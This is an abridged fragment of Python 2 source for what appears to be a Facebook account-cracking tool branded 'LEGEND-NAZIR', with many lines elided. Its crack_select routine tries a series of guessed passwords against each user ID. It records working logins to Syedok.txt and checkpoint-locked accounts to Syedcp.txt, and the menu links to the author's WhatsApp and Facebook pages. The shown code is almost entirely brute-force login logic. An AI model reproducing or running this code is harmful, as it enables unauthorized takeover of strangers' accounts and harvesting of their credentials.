...
def main_select():
    ...
    if SYED == '':
        ...
        os.system('xdg-open https://api.whatsapp.com/send/?phone=%2B923025669420&text&app_absent=0')
        main()
    elif SYED == '4':
        os.system('xdg-open https://www.facebook.com/NaZerkhaN521')
        main()
...
def login():
    ...
    try:
        ...
        print '\x1b[1;93m[2] \x1b[1;94mLogin With Fb id/pass\n'
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Syedok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Syedok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Syedok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Syedok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEDEND-NAZIR-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Syedok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Syedok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[LEGEND-NAZIR-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        if 'access_token' in q:
                            ...
                            if 'access_token' in q:
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEGEND-NAZIR-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Syedok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
